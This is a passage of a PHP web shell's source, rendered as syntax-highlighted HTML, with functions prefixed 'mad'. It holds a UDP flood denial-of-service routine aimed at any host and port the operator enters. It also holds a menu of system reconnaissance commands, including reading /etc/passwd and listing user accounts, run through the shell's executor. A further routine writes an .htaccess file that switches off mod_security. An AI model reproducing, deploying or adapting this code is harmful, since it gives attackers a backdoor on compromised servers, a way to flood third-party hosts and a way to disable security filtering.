<span class="lineno"> 928</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;binhex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">binhex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">bindec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
<span class="lineno"> 929</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span><span class="nv">$r</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">]));}</span><span class="k">return</span> <span class="nv">$r</span><span class="p">;}}</span>
<span class="lineno"> 930</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>
<span class="lineno"> 931</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>
<span class="lineno"> 932</span>    <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 933</span>        <span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span>
<span class="lineno"> 934</span>        <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span>
<span class="lineno"> 935</span>         <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span>
<span class="lineno"> 936</span>        <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span>
<span class="lineno"> 937</span>        <span class="s1">&#39;crypt&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span>
<span class="lineno"> 938</span>        <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span>
<span class="lineno"> 939</span>        <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span>
<span class="lineno"> 940</span>        <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span>
<span class="lineno"> 941</span>        <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span>
<span class="lineno"> 942</span>        <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span>
<span class="lineno"> 943</span>        
<span class="lineno"> 944</span>    <span class="p">);</span>
<span class="lineno"> 945</span>    
<span class="lineno"> 946</span>    <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno"> 947</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 948</span>    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno"> 949</span>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 950</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form  onSubmit=&#39;g(null,null,this.selectTool.value,this.input.value); return false;&#39;&amp;gt;&amp;lt;select name=&#39;selectTool&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 951</span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span>
<span class="lineno"> 952</span>        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 953</span>        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;/&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 954</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 955</span>        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span><span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span>
<span class="lineno"> 956</span>    <span class="p">}</span>
<span class="lineno"> 957</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 958</span>    <span class="nx">madFooter</span><span class="p">();</span>
<span class="lineno"> 959</span>     
<span class="lineno"> 960</span> <span class="p">}</span>
<span class="lineno"> 961</span> <span class="k">function</span> <span class="nf">maddos</span><span class="p">()</span>
<span class="lineno"> 962</span> <span class="p">{</span>
<span class="lineno"> 963</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno"> 964</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 965</span>   <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno"> 966</span>   <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 967</span>   <span class="k">echo</span> <span class="s1">&#39;&amp;lt;center&amp;gt;&amp;lt;span&amp;gt;| UDP DOSSIER |&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form onSubmit=&quot;g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;&quot; method=POST&amp;gt;&amp;lt;span&amp;gt;Host :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udphost&quot; type=&quot;text&quot;  size=&quot;25&quot; /&amp;gt;&amp;lt;span&amp;gt;Time :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udptime&quot; type=&quot;text&quot; size=&quot;15&quot; /&amp;gt;&amp;lt;span&amp;gt;Port :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udpport&quot; type=&quot;text&quot; size=&quot;10&quot; /&amp;gt;&amp;lt;input  type=&quot;submit&quot; value=&quot;&amp;gt;&amp;gt;&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 968</span>   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; &amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 969</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span>
<span class="lineno"> 970</span>     <span class="p">{</span>
<span class="lineno"> 971</span>          <span class="nv">$packets</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 972</span>         <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
<span class="lineno"> 973</span>         <span class="nv">$exec_time</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">];</span>
<span class="lineno"> 974</span>         <span class="nv">$time</span><span class="o">=</span><span class="nb">time</span><span class="p">();</span>
<span class="lineno"> 975</span>         <span class="nv">$max_time</span><span class="o">=</span><span class="nv">$exec_time</span><span class="o">+</span><span class="nv">$time</span><span class="p">;</span>
<span class="lineno"> 976</span>         <span class="nv">$host</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
<span class="lineno"> 977</span>         <span class="nv">$portudp</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span>
<span class="lineno"> 978</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="mi">65000</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
<span class="lineno"> 979</span>         <span class="p">{</span>
<span class="lineno"> 980</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="s1">&#39;X&#39;</span><span class="p">;</span>
<span class="lineno"> 981</span>         <span class="p">}</span>
<span class="lineno"> 982</span>         <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
<span class="lineno"> 983</span>     
<span class="lineno"> 984</span>          <span class="nv">$packets</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 985</span>             <span class="k">if</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$max_time</span><span class="p">){</span>
<span class="lineno"> 986</span>                     <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 987</span>             <span class="p">}</span>
<span class="lineno"> 988</span>             
<span class="lineno"> 989</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s1">&#39;udp://&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$portudp</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
<span class="lineno"> 990</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">){</span>
<span class="lineno"> 991</span>                     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
<span class="lineno"> 992</span>                     <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 993</span>             <span class="p">}</span>
<span class="lineno"> 994</span>             <span class="p">}</span>
<span class="lineno"> 995</span>          <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$packets</span><span class="s2"> (&quot;</span> <span class="o">.</span> <span class="nb">round</span><span class="p">((</span><span class="nv">$packets</span><span class="o">*</span><span class="mi">65</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; MB) packets averaging &quot;</span><span class="o">.</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$packets</span><span class="o">/</span><span class="nv">$exec_time</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; packets per second&quot;</span><span class="p">;</span>
<span class="lineno"> 996</span>          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 997</span>     <span class="p">}</span>
<span class="lineno"> 998</span>     
<span class="lineno"> 999</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1000</span>    
<span class="lineno">1001</span>     <span class="nx">madfooter</span><span class="p">();</span>        
<span class="lineno">1002</span> <span class="p">}</span>
<span class="lineno">1003</span> 
<span class="lineno">1004</span> <span class="k">function</span> <span class="nf">madproc</span><span class="p">()</span>
<span class="lineno">1005</span> <span class="p">{</span>
<span class="lineno">1006</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1007</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;Div class=header&amp;gt;&amp;lt;center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1008</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno">1009</span>   <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1010</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">)</span>
<span class="lineno">1011</span>   <span class="p">{</span>
<span class="lineno">1012</span>     <span class="nv">$process</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
<span class="lineno">1013</span>     <span class="s2">&quot;System Info&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;systeminfo&quot;</span><span class="p">,</span>
<span class="lineno">1014</span>     <span class="s2">&quot;Active Connections&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">,</span>
<span class="lineno">1015</span>    <span class="s2">&quot;Running Services&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net start&quot;</span><span class="p">,</span>
<span class="lineno">1016</span>    <span class="s2">&quot;User Accounts&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net user&quot;</span><span class="p">,</span>
<span class="lineno">1017</span>    <span class="s2">&quot;Show Computers&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net view&quot;</span><span class="p">,</span>
<span class="lineno">1018</span>     <span class="s2">&quot;ARP Table&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;arp -a&quot;</span><span class="p">,</span>
<span class="lineno">1019</span>     <span class="s2">&quot;IP Configuration&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ipconfig /all&quot;</span>
<span class="lineno">1020</span>     <span class="p">);</span>
<span class="lineno">1021</span>     <span class="p">}</span>
<span class="lineno">1022</span>   <span class="k">else</span>
<span class="lineno">1023</span>   <span class="p">{</span> 
<span class="lineno">1024</span>     <span class="nv">$process</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
<span class="lineno">1025</span>     <span class="s2">&quot;Process status&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ps aux&quot;</span><span class="p">,</span>
<span class="lineno">1026</span>     <span class="s2">&quot;Syslog&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat  /etc/syslog.conf&quot;</span><span class="p">,</span>
<span class="lineno">1027</span>     <span class="s2">&quot;Resolv&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;cat  /etc/resolv.conf&quot;</span><span class="p">,</span>
<span class="lineno">1028</span>     <span class="s2">&quot;Hosts&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /etc/hosts&quot;</span><span class="p">,</span>
<span class="lineno">1029</span>     <span class="s2">&quot;Passwd&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="p">,</span>
<span class="lineno">1030</span>     <span class="s2">&quot;Cpuinfo&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">,</span>
<span class="lineno">1031</span>     <span class="s2">&quot;Version&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /proc/version&quot;</span><span class="p">,</span>
<span class="lineno">1032</span>     <span class="s2">&quot;Sbin&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;ls -al /usr/sbin&quot;</span><span class="p">,</span>
<span class="lineno">1033</span>     <span class="s2">&quot;Interrupts&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /proc/interrupts&quot;</span><span class="p">,</span>
<span class="lineno">1034</span>     <span class="s2">&quot;lsattr&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;lsattr -va&quot;</span><span class="p">,</span>
<span class="lineno">1035</span>     <span class="s2">&quot;Uptime&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;uptime&quot;</span><span class="p">,</span>
<span class="lineno">1036</span>     <span class="s2">&quot;Fstab&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;cat /etc/fstab&quot;</span><span class="p">,</span>
<span class="lineno">1037</span>     <span class="s2">&quot;HDD Space&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;df -h&quot;</span>
<span class="lineno">1038</span>     <span class="p">);}</span>
<span class="lineno">1039</span>     
<span class="lineno">1040</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$process</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$link</span><span class="p">)</span>
<span class="lineno">1041</span>     <span class="p">{</span>
<span class="lineno">1042</span>         <span class="k">echo</span> <span class="s1">&#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(null,null,\&#39;&#39;</span><span class="o">.</span><span class="nv">$link</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&amp;gt; | &#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39; | &amp;lt;/a&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1043</span>     <span class="p">}</span>
<span class="lineno">1044</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1045</span>      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno">1046</span>      <span class="p">{</span>
<span class="lineno">1047</span>         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=&#39;ml1&#39; style=&#39;margin-top:5px&#39; &amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1048</span>         <span class="k">echo</span> <span class="nx">madEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno">1049</span>         <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1050</span>      <span class="p">}</span>
<span class="lineno">1051</span>      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1052</span>      <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1053</span>      <span class="p">}</span>
<span class="lineno">1054</span>      
<span class="lineno">1055</span> <span class="k">function</span> <span class="nf">madsafe</span><span class="p">()</span>
<span class="lineno">1056</span> <span class="p">{</span>
<span class="lineno">1057</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1058</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl =&amp;gt; *.sh  ] files create in following dir&amp;lt;br&amp;gt;| &quot;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; |&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1059</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;php.ini\&#39;,null)&quot;&amp;gt;| PHP.INI | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,null,\&#39;ini\&#39;)&quot;&amp;gt;| .htaccess(Mod) | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,null,null,\&#39;sh\&#39;)&quot;&amp;gt;| .htaccess(perl) | &amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1060</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
<span class="lineno">1061</span>     <span class="p">{</span>
<span class="lineno">1062</span>     <span class="nv">$fil</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.htaccess&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1063</span>     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fil</span><span class="p">,</span><span class="s1">&#39;&amp;lt;IfModule mod_security.c&amp;gt;</span>
<span class="lineno">1064</span> <span class="s1">Sec------Engine Off</span>
<span class="lineno">1065</span> <span class="s1">Sec------ScanPOST Off</span>
<span class="lineno">1066</span> <span class="s1">&amp;lt;/IfModule&amp;gt;&#39;</span><span class="p">);</span>
<span class="lineno">1067</span>     <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fil</span><span class="p">);</span>
<span class="lineno">1068</span>    <span class="p">}</span>
